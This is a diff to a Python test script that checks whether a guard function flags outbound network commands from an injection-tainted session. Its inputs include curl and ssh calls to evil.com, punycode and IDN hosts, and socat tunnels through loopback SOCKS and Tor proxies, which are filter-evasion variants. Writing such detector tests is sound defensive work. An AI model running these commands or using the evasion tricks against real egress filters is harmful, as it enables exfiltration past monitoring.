@@ -398,6 +398,30 @@ try:
 finally:
     cg.policy.state_get = _osg4
 
+print("=== Финал3-A3: FQDN с точкой, IDN/punycode, SOCKS через loopback ===")
+_osg5 = cg.policy.state_get
+cg.policy.state_get = lambda sid, key, default=None: (
+    True if key == "injection_tainted" else _osg5(sid, key, default))
+try:
+    for label, command in [
+            ("curl evil.com.",     "curl evil.com."),
+            ("ssh evil.com.",      "ssh evil.com."),
+            ("curl evil.com./x",   "curl evil.com./x"),
+            ("curl punycode",      "curl a.xn--p1ai"),
+            ("curl IDN рф",        "curl пример.рф"),
+            ("socks loopback-proxy", "socat - SOCKS4:127.0.0.1:evil.com:80"),
+            ("socks5 через tor",   "socat - SOCKS5-CONNECT:127.0.0.1:evil.com:80,socksport=9050")]:
+        r = cg._tainted_egress({"session_id": "t"}, command)
+        check("Финал3-A3 egress: {}".format(label), r, r)
+    # Контроль: это не должно стать egress.
+    for label, command in [
+            ("socat TCP:localhost", "socat - TCP:localhost:80"),
+            ("curl 127.0.0.1",      "curl http://127.0.0.1/")]:
+        r = cg._tainted_egress({"session_id": "t"}, command)
+        check("Финал3-A3 не egress: {}".format(label), not r, r)
+finally:
+    cg.policy.state_get = _osg5
+
 shutil.rmtree(TMP, ignore_errors=True)
 print("\nSUMMARY:", "ALL PASSED" if not FAILS else "FAILED({}) {}".format(len(FAILS), FAILS))
 sys.exit(1 if FAILS else 0)
